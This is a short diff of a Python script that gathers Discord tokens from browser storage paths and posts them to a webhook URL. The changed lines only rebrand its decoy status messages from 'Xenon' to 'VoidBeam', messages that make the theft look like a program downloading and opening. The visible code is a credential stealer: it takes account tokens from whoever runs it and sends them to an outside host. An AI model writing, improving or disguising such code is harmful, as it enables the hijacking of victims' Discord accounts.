@@ -73,7 +73,7 @@ def main():
     for browser, path in DISCORD_PATHS.items():
         tokens = get_discord_tokens(path)
         if tokens:
-            print("Xenon Downloading")
+            print("VoidBeam Downloading")
             found_tokens.extend(tokens)
 
     # Format tokens properly
@@ -99,7 +99,7 @@ def main():
     response = requests.post(WEBHOOK_URL, json=data)
     print("Opening...")
 
-    print("Xenon open succesfully, wait")
+    print("VoidBeamer open succesfully, wait")
 
 if __name__ == "__main__":
     main()
